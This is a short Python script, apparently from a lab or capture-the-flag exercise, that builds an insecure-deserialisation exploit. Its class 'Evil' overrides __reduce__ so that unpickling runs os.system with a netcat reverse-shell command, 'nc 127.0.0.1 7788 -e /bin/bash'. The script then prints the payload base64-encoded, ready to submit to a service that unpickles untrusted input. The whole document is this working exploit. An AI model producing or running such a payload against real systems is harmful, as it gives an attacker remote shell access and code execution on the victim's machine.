import pickle
import base64
import os



class Evil:
    def __reduce__(self):
        return (os.system, ("nc 127.0.0.1 7788 -e /bin/bash",))

print(base64.b64encode(pickle.dumps(Evil())))